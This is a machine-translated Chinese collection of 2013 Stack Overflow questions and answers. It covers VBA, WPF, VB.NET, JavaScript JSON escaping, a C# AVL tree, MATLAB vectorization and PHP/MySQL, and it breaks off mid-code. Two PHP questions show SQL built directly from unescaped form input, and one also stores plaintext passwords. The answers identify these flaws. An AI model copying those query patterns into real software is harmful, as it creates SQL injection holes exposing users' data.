我的解决方案是使用 Excel：

使用 SUMIFS 公式来跟踪在**仓库**级别分配的每个项目的总和。然后是另一个 MOD(6) 公式，它计算剩余直到 6 的倍数。然后我的实际 VBA 代码循环并从所需的**商店**级别单位中减去 1（如果 MOD <= 3）或添加（如果 MOD > 3），直到 MOD = 0 对于所有行。

现在这对我有用，但即使我只有约 5000 行也非常慢。

我正在寻找更快的解决方案，因为每次我减去/添加所需的单位时，都需要再次计算 SUMIFS 和 MOD。

**编辑：（试图更清楚）**

我有一个模板文件，我使用以下设置将数据粘贴到其中：

```
+------+-------+-----------+----------+--------------+--------+
| Item | Store | Warehouse | StoreQty | WarehouseQty | Mod(6) |
+------+-------+-----------+----------+--------------+--------+
|    1 |     1 |         1 |        2 |            8 |      2 |
|    1 |     2 |         1 |        3 |            8 |      2 |
|    1 |     3 |         1 |        1 |            8 |      2 |
|    1 |     4 |         1 |        2 |            8 |      2 |
|    2 |     1 |         2 |        1 |            4 |      2 |
|    2 |     2 |         2 |        3 |            4 |      2 |
+------+-------+-----------+----------+--------------+--------+ 
```

目前，WarehouseQty 列是 SUMIFS 公式，用于汇总与 Warehouse 关联的每个 Item-Store 组合的 StoreQty。所以我猜每次出现 Item-Store 组合时，Warehouse/WarehouseQty 列实际上都会重复多次。WarehouseQty 需要是 6 的倍数。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T19:59:58.263

可以关闭屏幕更新以加快长度计算，如下所示：

```
Application.ScreenUpdating = FALSE 
```

相反的分配会再次打开屏幕更新。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:15:04.150

猜测您可能会发现停止屏幕刷新可能会有所帮助，因此不需要更多建议。

另一种选择是根据`mod(6)`.

您还可以解决如何汇总所有商店中特定商品的数量，使用数据透视表并从中读取总和比`sumifs`在宏中使用要快得多

根据您对问题的修改：

你是正确的，你可以有大量的复制逐行进行计算，以及一次调整一个单位的数量，即使你知道你需要从 mod 中添加/删除多少单位（ 6）公式。

您能否创建一个包含产品 ID 和商店的所有可能组合的新工作表。然后，您可以对这些独特组合中的每一个使用 sumifs() 并在仓库级别的最后一步向上/向下舍入？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T20:20:38.760

首先将数据放入数组，而不是单元格，然后在操作后将数据放回 - 这会快得多。

使用您的标准的示例：

```
Option Explicit

Sub test()
Dim q() 'this is what will be used for the range
Dim i As Long

q = Range("C2:C41") 'put the data into the array - *ALWAYS* 2 dimensions, even if a single column
For i = LBound(q) To UBound(q) ' use this, in case it's a dynamic array - 1 to 40 would have worked here
    Select Case q(i, 1) Mod 6 ' calculate remander
        Case 0 To 3
            q(i, 1) = q(i, 1) - (q(i, 1) Mod 6) 'make a multiple of 6
        Case 4 To 5
            q(i, 1) = q(i, 1) - (q(i, 1) Mod 6) + 6 ' and go higher in the later numbers
    End Select
Next i

Range("D2:D41") = q ' drop the data back

End Sub 
```

# c# - WPF 中的绑定验证和 SaveCommand

> ID：15533377
> 
> 赞同：0
> 
> 时间：2013-03-20T19:53:42.823
> 
> 标签：c#, wpf, validation, xaml, data-binding

我有几个`TextBox`绑定属性。这些属性由 Validation.ErrorTemplate 测试。我不使用 MVVM。

**我添加了一个按钮来保存我的输入：**

```
<Button Template="{StaticResource BoutonRessourcesTpl}" Command="Save">
  <Button.CommandBindings>
    <CommandBinding Command="Save"  Executed="Save_Executed" CanExecute="Save_CanExecute"/>
  </Button.CommandBindings>
  <Image Source= "Toolbar_Valider.png" Height="16"/>
</Button> 
```

在我后面的代码中，我写了这个：

```
 private void Save_Executed(object sender, ExecutedRoutedEventArgs e)
    {
    }

    private void Save_CanExecute(object sender, CanExecuteRoutedEventArgs e)
    {
        e.CanExecute = IsValid(sender as DependencyObject);
    }

    private bool IsValid(DependencyObject obj)
    {
        // The dependency object is valid if it has no errors, 
        //and all of its children (that are dependency objects) are error-free.
        return !Validation.GetHasError(obj) &&
            LogicalTreeHelper.GetChildren(obj)
            .OfType<DependencyObject>()
            .All(child => IsValid(child));
    } 
```

我的问题是我不知道在哪里调用我的代码来保存输入。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T21:17:22.847

您将代码放在 Save_Executed 函数中。例如，请参阅：http: [//msdn.microsoft.com/en-us/library/system.windows.input.commandbinding.aspx](http://msdn.microsoft.com/en-us/library/system.windows.input.commandbinding.aspx)。尽管在该示例中，CommandBinding 被放置在 Button 的所有者窗口中。

# vb.net - 长 if 语句

> ID：15533378
> 
> 赞同：0
> 
> 时间：2013-03-20T19:53:47.100
> 
> 标签：vb.net, if-statement

我正在为我的学校课程构建一个计算项目，并且我有一个相当大的`if`声明。当我运行程序时，它一点也不慢，但我只是想知道写大`if`语句是否被认为是不好的。

```
 For BookingNumber = 0 To intBookingCount - 1
            If intStartPeriod(BookingNumber) = 1 And strComputerRoom(BookingNumber) = strCR Then
                radRadioButton1.Enabled = False
                If intLength(BookingNumber) = 1 Then
                ElseIf intLength(BookingNumber) = 2 Then
                    radRadioButton2.Enabled = False
                ElseIf intLength(BookingNumber) = 3 Then
                    radRadioButton2.Enabled = False
                    radRadioButton3.Enabled = False
                ElseIf intLength(BookingNumber) = 4 Then
                    radRadioButton2.Enabled = False
                    radRadioButton3.Enabled = False
                    radRadioButton4.Enabled = False
                ElseIf intLength(BookingNumber) = 5 Then
                    radRadioButton2.Enabled = False
                    radRadioButton3.Enabled = False
                    radRadioButton4.Enabled = False
                    radRadioButton5.Enabled = False
                ElseIf intLength(BookingNumber) = 6 Then
                    radRadioButton2.Enabled = False
                    radRadioButton3.Enabled = False
                    radRadioButton4.Enabled = False
                    radRadioButton5.Enabled = False
                    radRadioButton6.Enabled = False
                ElseIf intLength(BookingNumber) = 7 Then
                    radRadioButton2.Enabled = False
                    radRadioButton3.Enabled = False
                    radRadioButton4.Enabled = False
                    radRadioButton5.Enabled = False
                    radRadioButton6.Enabled = False
                    radRadioButton7.Enabled = False
                End If
            ElseIf intStartPeriod(BookingNumber) = 2 And strComputerRoom(BookingNumber) = strCR Then
                radRadioButton2.Enabled = False
                If intLength(BookingNumber) = 2 Then
                    radRadioButton3.Enabled = False
                ElseIf intLength(BookingNumber) = 3 Then
                    radRadioButton3.Enabled = False
                    radRadioButton4.Enabled = False
                ElseIf intLength(BookingNumber) = 4 Then
                    radRadioButton3.Enabled = False
                    radRadioButton4.Enabled = False
                    radRadioButton5.Enabled = False
                ElseIf intLength(BookingNumber) = 5 Then
                    radRadioButton3.Enabled = False
                    radRadioButton4.Enabled = False
                    radRadioButton5.Enabled = False
                    radRadioButton6.Enabled = False
                ElseIf intLength(BookingNumber) = 6 Then
                    radRadioButton3.Enabled = False
                    radRadioButton4.Enabled = False
                    radRadioButton5.Enabled = False
                    radRadioButton6.Enabled = False
                    radRadioButton7.Enabled = False
                End If
            ElseIf intStartPeriod(BookingNumber) = 3 And strComputerRoom(BookingNumber) = strCR Then
                radRadioButton3.Enabled = False
                If intLength(BookingNumber) = 2 Then
                    radRadioButton4.Enabled = False
                ElseIf intLength(BookingNumber) = 3 Then
                    radRadioButton4.Enabled = False
                    radRadioButton5.Enabled = False
                ElseIf intLength(BookingNumber) = 4 Then
                    radRadioButton4.Enabled = False
                    radRadioButton5.Enabled = False
                    radRadioButton6.Enabled = False
                ElseIf intLength(BookingNumber) = 5 Then
                    radRadioButton4.Enabled = False
                    radRadioButton5.Enabled = False
                    radRadioButton6.Enabled = False
                    radRadioButton7.Enabled = False
                End If
            ElseIf intStartPeriod(BookingNumber) = 4 And strComputerRoom(BookingNumber) = strCR Then
                radRadioButton4.Enabled = False
                If intLength(BookingNumber) = 2 Then
                    radRadioButton5.Enabled = False
                ElseIf intLength(BookingNumber) = 3 Then
                    radRadioButton5.Enabled = False
                    radRadioButton6.Enabled = False
                ElseIf intLength(BookingNumber) = 4 Then
                    radRadioButton5.Enabled = False
                    radRadioButton6.Enabled = False
                    radRadioButton7.Enabled = False
                End If
            ElseIf intStartPeriod(BookingNumber) = 5 And strComputerRoom(BookingNumber) = strCR Then
                radRadioButton5.Enabled = False
                If intLength(BookingNumber) = 2 Then
                    radRadioButton6.Enabled = False
                ElseIf intLength(BookingNumber) = 3 Then
                    radRadioButton6.Enabled = False
                    radRadioButton7.Enabled = False
                End If
            ElseIf intStartPeriod(BookingNumber) = 6 And strComputerRoom(BookingNumber) = strCR Then
                radRadioButton6.Enabled = False
                If intLength(BookingNumber) = 2 Then
                    radRadioButton7.Enabled = False
                End If
            ElseIf intStartPeriod(BookingNumber) = 7 And strComputerRoom(BookingNumber) = strCR Then
                radRadioButton7.Enabled = False
            End If
        Next
    Next
End Function 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T19:56:18.917

它很难阅读，但适当的缩进可以缓解这种情况。这也可能表明您的代码需要进行一些重构。例如，很长的`if`语句可以这样写：

```
if (condition == A && condition == C 
        && (someCondition >= 1000 || someOtherCondition != C) 
        || someThirdCondition == D) {

    ...

} 
```

此外，请务必利用短路的布尔语句并将最容易评估的表达式放在首位。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:46:43.840

```
For BookingNumber = 0 To intBookingCount - 1
  bookingNumberLength = intLength(BookingNumber)
  If strComputerRoom(BookingNumber) = strCR then
    Select Case intStartPeriod(BookingNumber)
      Case 1
        radRadioButton1.Enabled = False
        Select Case bookingNumberLength
          Case 2
            radRadioButton2.Enabled = False
          Case 3
            radRadioButton2.Enabled = False
            radRadioButton3.Enabled = False
          Case 4
            radRadioButton2.Enabled = False
            radRadioButton3.Enabled = False
            radRadioButton4.Enabled = False
          Case 5
            radRadioButton2.Enabled = False
            radRadioButton3.Enabled = False
            radRadioButton4.Enabled = False
            radRadioButton5.Enabled = False
          Case 6
            radRadioButton2.Enabled = False
            radRadioButton3.Enabled = False
            radRadioButton4.Enabled = False
            radRadioButton5.Enabled = False
            radRadioButton6.Enabled = False
          Case 7
            radRadioButton2.Enabled = False
            radRadioButton3.Enabled = False
            radRadioButton4.Enabled = False
            radRadioButton5.Enabled = False
            radRadioButton6.Enabled = False
            radRadioButton7.Enabled = False
         End Select
      Case 2
      Case 3
      Case 4
      Case 5
      Case 6
        radRadioButton6.Enabled = False
        If intLength(BookingNumber) = 2 Then
          radRadioButton7.Enabled = False
        End If
      Case 7
        radRadioButton7.Enabled = False
    End Select 
  End If
Next 
```

当你这样做时寻找简化的事情你的代码没有做任何事情，除非 strComputerRoom(BookingNumber) = strCR.

这看起来没什么大不了的，但如果你开始砍掉这样的东西，你就会得到真正的东西。

注意可能已经填满了 VB，因为我是一个 C# 男孩，我会让你填写它的其余部分......我我会把这些单选按钮放在一个数组中，然后它就只是一个改变所有 if 和 elseing 的问题，以便在你对它们进行 sussed 之后提出循环的开始和结束之类的东西。

```
For rb = rbStart To rbEnd
  MyButtons[rb].Enabled = False
Next 
```

看着它，你可以从几行数学开始计算。不过可能会挑战你的老师，我不知道你的距离有多远。当你在大约五行代码中给出这个时，他们可能会怀疑，如果我为你做，你就不会学习 nuffin'。

程序员规则 #21 - 我们不喜欢大量打字。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T21:41:42.697

**更新**

我收回它，你可以用这个替换你的**所有**代码：

```
For BookingNumber = 0 To intBookingCount - 1

    If intStartPeriod(BookingNumber) = 1 Then radRadioButton1.Enabled = False
    If intStartPeriod(BookingNumber) = 2 Then radRadioButton2.Enabled = False
    If intStartPeriod(BookingNumber) = 3 Then radRadioButton3.Enabled = False
    If intStartPeriod(BookingNumber) = 4 Then radRadioButton4.Enabled = False
    If intStartPeriod(BookingNumber) = 5 Then radRadioButton5.Enabled = False
    If intStartPeriod(BookingNumber) = 6 Then radRadioButton6.Enabled = False
    If intStartPeriod(BookingNumber) = 7 Then radRadioButton7.Enabled = False

    Dim total = intStartPeriod(BookingNumber) + intLength(BookingNumber)
    If total >= 3 Then radRadioButton2.Enabled = False
    If total >= 4 Then radRadioButton3.Enabled = False
    If total >= 5 Then radRadioButton4.Enabled = False
    If total >= 6 Then radRadioButton5.Enabled = False
    If total >= 7 Then radRadioButton6.Enabled = False
    If total >= 8 Then radRadioButton7.Enabled = False

Next 
```

大量的 if 块非常不受欢迎。一般来说，如果可能的话，最好将它们排除在外。例如，你会经常看到类似的东西

```
Sub DoStuff()
    If conditionA Then
        DoSomeStuff()
        If conditionB Then
            DoMoreStuff()
        End If
    End If
End Sub 
```

这可以重构为：

```
Sub DoStuff()
    If Not conditionA Then Return

    DoSomeStuff()

    If Not conditionB Then Return

    DoMoreStuff()
End Sub 
```

不久前我问了一个类似（不一样）的问题，得到了这个非常有用的答案：
[https ://softwareengineering.stackexchange.com/a/174977/57863](https://softwareengineering.stackexchange.com/a/174977/57863)

链接到：
[https ://softwareengineering.stackexchange.com/a/172910/57863](https://softwareengineering.stackexchange.com/a/172910/57863)

提供了一些关于重构主题的重要链接。

# javascript - 如何在存储为 Javascript 变量的 HTML 字符串中转义 JSON？

> ID：15533382
> 
> 赞同：3
> 
> 时间：2013-03-20T19:53:56.187
> 
> 标签：javascript, jquery, json, parsing, escaping

我正在尝试解析 JSON 字符串，但由于非法字符而无法使其工作 - 我找不到......

这是我所拥有的：

```
make = function (el) {
    var config = el.getAttribute("data-config");
    console.log(config);
    var dyn = $.parseJSON(config)
    console.log(dyn);
}

var a= document.createElement("<a href='#' class='template' data-config=\"{'role':'button','iconpos':'left','icon':'star','corners':'false','shadow':'false', 'iconshadow':'false', 'theme':'a','class':'test', 'href':'index.html','text':'Star Icon', 'mini':'true', 'inline':'true'}\">Star Icon</a>");
console.log(a);
make(a); 
```

我不确定如何正确地对原始字符串“a”中的 JSON 进行转义，以使其正常工作。

**问题_：**
我需要转义哪些引号才能使其正常工作？

谢谢！

**编辑：**

好的。我想通了`Jquery`（虽然我更喜欢Javascript）。这有效：

```
make = function (el) {
    var config = el.attr("data-config");
        console.log(config);
    var dyn = $.parseJSON(config)
        console.log(dyn);
}

var c = $('<a href="#" class="template" data-config=\'{"role":"button","iconpos":"left","icon":"star","corners":"false","shadow":"false", "iconshadow":"false", "theme":"a","class":"test", "href":"index.html","text":"Star Icon", "mini":"true", "inline":"true"}\'>Star Icon</a>')
console.log(c);
make(c); 
```

因此，转义 JSON 字符串的开始/结束引号似乎可以解决问题。实际的问题是我不能使用`document.createElement`完整的字符串。我只能创建元素`document.createElement(a)`然后设置`innerHTML`。需要再研究一下。

如果有人可以告诉我如何做到这一点，请告诉我一个仅限 Javascript 的方法。

谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-20T19:58:54.027

[JSON 中的字符串和对象键必须用**双**引号引起来。](http://json.org)属性中的双引号无效，因此您需要[使用`&quot;`](http://jsfiddle.net/mattball/MCDKL/).

此外，您可能想使用布尔值`true`/`false`而不是字符串`"true"`/ `"false"`。

```
var a = document.createElement('<a href="#" class="template" data-config="{&quot;role&quot;:&quot;button&quot;,&quot;iconpos&quot;:&quot;left&quot;,&quot;icon&quot;:&quot;star&quot;,&quot;corners&quot;:false,&quot;shadow&quot;:false,&quot;iconshadow&quot;:false,&quot;theme&quot;:&quot;a&quot;,&quot;class&quot;:&quot;test&quot;, &quot;href&quot;:&quot;index.html&quot;,&quot;text&quot;:&quot;Star Icon&quot;, &quot;mini&quot;:true,&quot;inline&quot;:true}\">Star Icon</a>'); 
```

请注意，这是完全不可读的，[@millimoose 关于之后设置属性的建议](https://stackoverflow.com/questions/15533382/how-to-escape-json-in-an-html-string-stored-as-a-javascript-variable/15533473#comment22005432_15533382)从长远来看将使这更容易处理。

# c# - 如何在 listBox 中搜索专辑并将其连接到 AVL 树或二叉搜索树？C＃

> ID：15533386
> 
> 赞同：-1
> 
> 时间：2013-03-20T19:54:11.223
> 
> 标签：c#

我需要出现在列表框中的专辑，以具有通过 AVL 树或二叉搜索树的搜索功能。

这是我的 AVLTree 类代码

```
 class AVLTree<T> : BSTree<T> where T : IComparable
    {
        public new void InsertItem(T item)
        {
            insertItem(item, ref root);
        }

        private void insertItem(T item, ref Node<T> tree)
        {
                 if (tree == null)
            tree = new Node<T>(item);
        else if (item.CompareTo(tree.Data) < 0)
            insertItem(item, ref tree.Left);
        else if (item.CompareTo(tree.Data) > 0)
        insertItem (item, ref tree.Right);
                 tree.balanceFactor = Height(tree.Left)-Height(tree.Right);
                 if (tree.balanceFactor <= -2)
                     rotateLeft(ref tree);
                 if (tree.balanceFactor >= 2)
                     rotateRight(ref tree);

       }

        private void rotateLeft(ref Node<T> tree)
        {             

            if (tree.Right.balanceFactor > 0)  
                rotateRight(ref tree.Right);
            Node<T> pivot = tree.Right;
            tree.Right = pivot.Left;
            pivot.Left = tree;
            tree = pivot;

        }

        private void rotateRight(ref Node<T> tree)
        {

            if (tree.Left.balanceFactor > 0) 
                rotateLeft(ref tree.Left);
            Node<T> pivot = tree.Left;              
            tree.Left = pivot.Right;
            pivot.Right = tree;
            tree = pivot;
        }
    }

} 
```

表单类：

//搜索按钮

```
 private void Search_Click(object sender, EventArgs e) //BASIC SEARCH NOT SUITABLE YET
    {
        listBox1.ClearSelected();
        int index = listBox1.FindString(SearchText.Text);
        if (index <0)

        {
            MessageBox.Show("Item not found.");
            SearchText.Text = String.Empty;
        }
        else
        {
            listBox1.SelectedIndex = index;
        } 
```

.

//ARTIST CLASS { 类艺术家：IComparable {

```
 public String name; //changed to public
    public String member;
    public LinkedList<String> Album;

    public Artist(String artistname, String members, String[] albName) 
        {
            name = artistname;
            member = members;
            Album = new LinkedList<String>(albName);
        }

    public LinkedList<String> getAlbum()
    {
        return Album;
    }

    public int CompareTo(object obj)
    {
        if (obj is Artist) //Artist name comparison
        {
            Artist other = (Artist)obj;
            return name.CompareTo(other.name);
        }
        if (obj is string) //Album comparison
        {
            Artist other = (Artist)obj;
            return name.CompareTo(other.Album);
        }
        else
            return -999;  //Comparison can not be made
    }
} 
```

}

//专辑类

类专辑{

```
 private String title;
    private String daterel;

    public Album(String aTitle, String saleDate) 
    {
        daterel = saleDate;
        title = aTitle;           
    }
} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:39:24.883

如果这是 Winforms，您可以将 listbox1 中的项目添加到数组中，然后遍历它们，在每个项目上调用您的搜索函数。

# matlab - 将任意数量的矩阵相乘任意次数

> ID：15533391
> 
> 赞同：3
> 
> 时间：2013-03-20T19:54:27.670
> 
> 标签：matlab

我找到了几个问题/答案，用于向量化和加速在单个循环中将矩阵和向量相乘的例程，但我正在尝试做一些更通用的事情，即将任意数量的矩阵相乘，然后执行操作任意次数。

我正在编写一个通用例程，用于计算任意层数与光学频率的薄膜反射。对于每个光学频率`W`，每一层都有一个折射率`N`和一个相关的 2x2 传递矩阵`L`和 2x2 界面矩阵`I`，这取决于折射率和层的厚度。如果`n`是层数，并且`m`是频率数，那么我可以将索引向量化为一个 nxm 矩阵，但是为了计算每个频率的反射，我必须进行嵌套循环。由于我最终将其用作拟合例程的一部分，因此我将不胜感激我能做的任何事情来加快它的速度。

这应该提供一个最小的工作示例：

```
W = 1260:0.1:1400; %frequency in cm^-1
N = rand(4,numel(W))+1i*rand(4,numel(W)); %dummy complex index of refraction
D = [0 0.1 0.2 0]/1e4; %thicknesses in cm
[n,m] = size(N);
r = zeros(size(W));

for x = 1:m %loop over frequencies
  C = eye(2); % first medium is air

  for y = 2:n %loop over layers

    na = N(y-1,x);
    nb = N(y,x);

    %I = InterfaceMatrix(na,nb); % calculate the 2x2 interface matrix
    I = [1 na*nb;na*nb 1]; % dummy matrix

    %L = TransferMatrix(nb) % calculate the 2x2 transfer matrix
    L = [exp(-1i*nb*W(x)*D(y)) 0; 0 exp(+1i*nb*W(x)*D(y))]; % dummy matrix

    C = C*I*L;
  end

  a = C(1,1);
  c = C(2,1);

  r(x) = c/a; % reflectivity, the answer I want.
end 
```

对于具有 2562 个频率的三层（空气/材料/基板）问题的两个不同极化运行两次，需要 0.952 秒，而使用三层系统的显式公式（矢量化）解决完全相同的问题需要 0.0265 秒。问题是，超过 3 层，显式公式很快变得难以处理，我必须为每个层数有一个不同的子例程，而以上是完全通用的。

是否有希望将此代码矢量化或以其他方式加速它？

（编辑补充说我在代码中留下了一些东西来缩短它，所以请不要尝试使用它来*实际*计算反射率）

编辑：为了澄清，每个层`I`和`L`每个频率都不同，所以它们在每个循环中都会改变。简单地取指数是行不通的。对于一个真实世界的例子，以空气中的肥皂泡为例。共有三层（空气/肥皂/空气）和两个接口。对于给定的频率，完整的传输矩阵`C`为：

```
C = L_air * I_air2soap * L_soap * I_soap2air * L_air; 
```

和`I_air2soap ~= I_soap2air`。因此，我从`L_air = eye(2)`连续的层开始然后向下，计算 I_(y-1,y) 和 L_y，将它们与前一个循环的结果相乘，一直持续到我到达堆栈的底部。然后我抓住第一个和第三个值，取比率，这就是那个频率的反射率。然后我进入下一个频率并重新做一遍。

我怀疑答案将以某种方式涉及每一层的块对角矩阵，如下所述。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:55:55.967

不是在 matlab 旁边，所以这只是一个启动器，而不是双循环，您可以写`na*nb`为`Nab=N(1:end-1,:).*N(2:end,:);` 指数中的项`nb*W(x)*D(y)`可以写为`e=N(2:end,:)*W'*D;` 结果`I*L`是一个 2x2 块矩阵，具有以下形式：

```
M = [1, Nab; Nab, 1]*[e-, 0;0, e+] = [e- , Nab*e+ ; Nab*e- , e+] 
```

使用`e-`as exp(-1i*e) 和`e+`as exp(1i*e)'

查看`kron`如何获得块矩阵形式，以矢量化传播`C=C*I*L`只需`M^n`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-21T01:16:10.357

@Lama 通过建议块矩阵让我走上了正确的道路，但最终的答案最终变得更加复杂，所以我把它放在这里是为了后代。由于每一层的传输和接口矩阵都不同，我在层上的循环中保留，但构造一个大的稀疏块矩阵，其中每个块代表一个频率。

```
W = 1260:0.1:1400; %frequency in cm^-1
N = rand(4,numel(W))+1i*rand(4,numel(W)); %dummy complex index of refraction
D = [0 0.1 0.2 0]/1e4; %thicknesses in cm
[n,m] = size(N);
r = zeros(size(W));

C = speye(2*m); % first medium is air
even = 2:2:2*m;
odd = 1:2:2*m-1;

for y = 2:n %loop over layers

  na = N(y-1,:);
  nb = N(y,:);

  % get the reflection and transmission coefficients from subroutines as a vector
  % of length m, one value for each frequency
  %t = Tab(na, nb);
  %r = Rab(na, nb);
  t = rand(size(W)); % dummy vector for MWE
  r = rand(size(W)); % dummy vector for MWE

  % create diagonal and off-diagonal elements.  each block is [1 r;r 1]/t
  Id(even) = 1./t;
  Id(odd) = Id(even);
  Io(even) = 0;
  Io(odd) = r./t;

  It = [Io;Id/2].';
  I = spdiags(It,[-1 0],2*m,2*m);

  I = I + I.';

  b = 1i.*(2*pi*D(n).*nb).*W;
  B(even) = -b;
  B(odd)  =  b;
  L = spdiags(exp(B).',0,2*m,2*m);

  C = C*I*L;
end

a = spdiags(C,0);
a = a(odd).';

c = spdiags(C,-1);
c = c(odd).';

r = c./a; % reflectivity, the answer I want. 
```

使用上面提到的 3 层系统，它并没有显式公式那么快，但它很接近，并且在一些分析后可能会变得更快一点。原始代码的完整版本为 0.97 秒，公式为 0.012 秒，稀疏对角线版本为 0.065 秒。

# php - 一个选择不发布所选选项

> ID：15533392
> 
> 赞同：0
> 
> 时间：2013-03-20T19:54:29.600
> 
> 标签：php, mysql, select, drop-down-menu

示例...即使选择了“>”大于选项，也会显示此查询

```
SELECT * 
FROM sr_rounds 
WHERE cir1 LIKE '%2.4%' 
ORDER BY sr_id asc 
```

有任何想法吗？

```
<form action="search_new.php" method="post" name="exchanges" id="exchanges">
<select name="circuits" id="circuits" onclick="searchIt()" onblur="searchIt()">
<option value="select" selected="selected">Select Search Field</option>
<option value="cir1">Circuit 1</option>
<option value="cir2">Circuit 2</option>
<option value="cir3">Circuit 3</option>
<option value="cir4">Circuit 4</option>
<option value="vch">VCH-1-5</option>
</select>

<select name="sorting" id="sorting" onclick="searchIt()" onblur="searchIt()">
<option value="select1" selected="selected">Sort By</option>
<option value="sr_id">Sector</option>
<option value="date">Date</option>

//This select always returns a "like" clause regardless of which option you select 

</select>
<select name="clauses" id="clauses" onclick="searchIt()" onblur="searchIt()">
<option value="select2" selected="selected">Clause</option>
<option value="=">Equals</option>
<option value="like">Like</option>
<option value=">">Greater Than</option>
<option value="<">Less Than</option>
<option value="date">Date</option>
</select>
&nbsp;
<select name="sortorder" id="sortorder" onclick="searchIt()" onblur="searchIt()">
<option value="select3" selected="selected">Order</option>
<option value="asc" name="1">Asc</option>
<option value="desc" name="2">Desc</option>
</select> 
```

```
<?php
$select = $_POST['circuits'];
$searchdb = $_POST['searchdb'];
$select1 = $_POST['sorting'];
$select2 = $_POST['clauses'];
$select3 = $_POST['sortorder'];

//To display friendly field name instead of actual field name
if ($select == 'cir1')
{
$boxresult = 'Circuit 1';
}
if ($select == 'cir2')
{
$boxresult = 'Circuit 2';
}
if ($select == 'cir3')
{
$boxresult = 'Circuit 3';
}
if ($select == 'cir4')
{
$boxresult = 'Circuit 4';
}
if ($select == 'vch')
{
$boxresult = 'VCH-1-5';
}
//To use different queries while searching

if ($select2 == '=')
{
$queres = "SELECT * FROM sr_rounds WHERE $select = '$searchdb' ORDER BY $select1 $select3";
}
else if ($select2 == 'like')
{
$queres = "SELECT * FROM sr_rounds WHERE $select LIKE '$searchdb' ORDER BY $select1 $select3";
}
else if ($select2 == '>')
{
$queres = "SELECT * FROM sr_rounds WHERE $select > '$searchdb' ORDER BY $select1 $select3";
}
else if ($select2 == '<')
{
$queres = "SELECT * FROM sr_rounds WHERE $select < '$searchdb' ORDER BY $select1 $select3";
}
else if ($select2 == 'contain');
{
$queres = "SELECT * FROM sr_rounds WHERE $select LIKE '%$searchdb%' ORDER BY $select1 $select3";
}

$query = $queres;
$result = @mysql_query($query);
$num = @mysql_num_rows($result); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:03:18.433

您的代码中有错字：

```
else if ($select2 == 'contain');
// ----------------------------^ 
```

这结束了 if 块。下一个`{}`块总是执行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T20:07:40.423

这是因为您在该行中有一个分号：

```
else if ($select2 == 'contain'); 
```

做了

```
else if ($select2 == 'contain') 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T20:01:36.517

写在你的`search_new.php`：

```
var_dump($_POST); exit(); 
```

检查什么是`clauses`值。我也会寻求另一种价值观的代表。我倾向于使用数字并将`if/else`结构简化为一个`switch`块，但无论如何你可以坚持任何事情。只是一个建议。不要使用 >、< 和 =，而是使用“更大”、“更低”和“等于”或其他词，因为 < 和 > 是 xml 结构的一部分，您的浏览器可能无法理解这一点。如果您检查您编写的代码块，您会发现 > 实际上表现不佳。它被漆成黑色，而不是棕色/红色。

**总结一下：**

*   检查值`$_POST`
*   将选项值更改为数字或单词，而不是符号。

# php - 不安全的登录脚本 - 如何保护

> ID：15533398
> 
> 赞同：1
> 
> 时间：2013-03-20T19:54:46.723
> 
> 标签：php, mysql, code-injection

我正在调查一个可以注入 sql 的项目（一个用户报告了它）。

这是登录脚本的一部分：

```
 $loginemail = $_POST['loginemail'];                 
            $loginemail_sql = mysql_real_escape_string($loginemail);                

            $password = $_POST['loginpass'];                 
            $password_sql = mysql_real_escape_string($password);                

             //get user data
            $q = 'SELECT uid, full_name, score, status FROM users WHERE email="'.$loginemail.'" AND password="'.$password_sql.'" LIMIT 1'; 
```

我现在想如果这是可以注入的代码的一部分？是否存在 $loginemail 和 $password 处理不正确并且可能包含一些危险的“SQL 部分”的问题？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T19:58:02.847

让我们来看看：

> [**请不要`mysql_*`在新代码中使用函数**](https://stackoverflow.com/q/12859942/)。它们不再被维护[并被正式弃用](https://wiki.php.net/rfc/mysql_deprecation)。看到[**红框**](https://www.php.net/manual/en/function.mysql-connect.php)了吗？改为了解[*准备好的语句*](https://en.wikipedia.org/wiki/Prepared_statement)，并使用[PDO](http://php.net/pdo)或[MySQLi](http://php.net/mysqli) -[本文](https://php.net/manual/en/mysqlinfo.api.choosing.php)将帮助您决定使用哪个。如果您选择 PDO，[这里有一个很好的教程](http://wiki.hashphp.org/PDO_Tutorial_for_MySQL_Developers)。

对于初学者。

其次，您正在转义`$loginemail`，但使用未转义的版本（而不是`$loginmail_sql`）。

第三，您的代码暗示您将密码按原样存储在数据库中。你不应该。如果攻击者掌握了数据库，您的密码就会被泄露。您应该散列密码并将散列存储在那里。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T19:56:55.517

是的，您`$loginemail`在查询中使用的是未更改的。改为使用`$loginemail_sql`。

如需进一步阅读，请查看*[如何防止 PHP 中的 SQL 注入？](https://stackoverflow.com/q/60174/53114)*

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-20T20:20:50.200

正如@Madara Uchiha 所说，最好停止使用 mysql_* 函数。但他没有举出例子。所以我会的。对不起我的英语，我是巴西人:)

PDO：

```
<?php
$loginemail = $_POST['loginemail'];
$password = $_POST['loginpass'];

// open a PDO connection within mysql driver
// PDO uses DSN string for connections they look like: "driver:options"
$dsn = 'mysql:dbname=testdb;host=127.0.0.1';
// DB username
$dbUser = 'dbuser';
// DB password
$dbPassword = 'dbpass';
// PDO is instantiable, so you need to create an object for each connection
$dbh = new PDO($dsn, $dbUser, $dbPassword);
// You must prepare your query, PDO uses a placeholder system for sanitize data and avoid injection, params can be passed using "?" or ":varname"
$stmt = $dbh->prepare('SELECT uid, full_name, score, status FROM users WHERE email= :email AND password= :password LIMIT 1');
// Binding a param called :email
$stmt->bindValue(':email', $loginemail);
